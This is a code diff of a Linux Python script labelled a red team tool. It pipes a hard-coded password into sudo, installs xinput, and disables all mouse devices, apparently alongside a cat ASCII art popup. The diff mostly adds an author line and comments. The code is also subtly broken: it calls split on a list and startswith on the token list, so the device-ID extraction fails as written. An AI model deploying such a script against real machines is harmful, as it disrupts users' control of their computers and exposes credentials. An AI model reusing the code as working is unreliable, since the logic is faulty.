@@ -1,3 +1,5 @@
+# Author: Ashley Jablonski
+#
 # red team tool that will disable mouse functionality and pop up with a cat ascii art
 # runs on linux
 
@@ -34,18 +36,20 @@ os.system(f'echo {PASSWORD} | sudo -S apt install xinput')
 
 # getting mouse devices
 output = sp.run("xinput list", capture_output=True, text=True)
-
 cleaned = [line for line in output.stdout.splitlines() if "mouse" in line.lower()]
 
 # get the id of the mouse devices
 ids = []
 for line in cleaned:
+    # split lines to search in for loop
     token = cleaned.split()
+    # find id
     for x in token:
         if token.startswith("id="):
-            # Extract the ID value from 'id=<number>'
-            ids.append(token.split('=')[1])  # The ID is after the '='
+            # get the id value from 'id=<number>'
+            ids.append(token.split('=')[1])  
 
+# disable ALL of the ids, since you dont know what the actual one is
 for id in ids:
     os.system(f"xinput disable {id}")
 
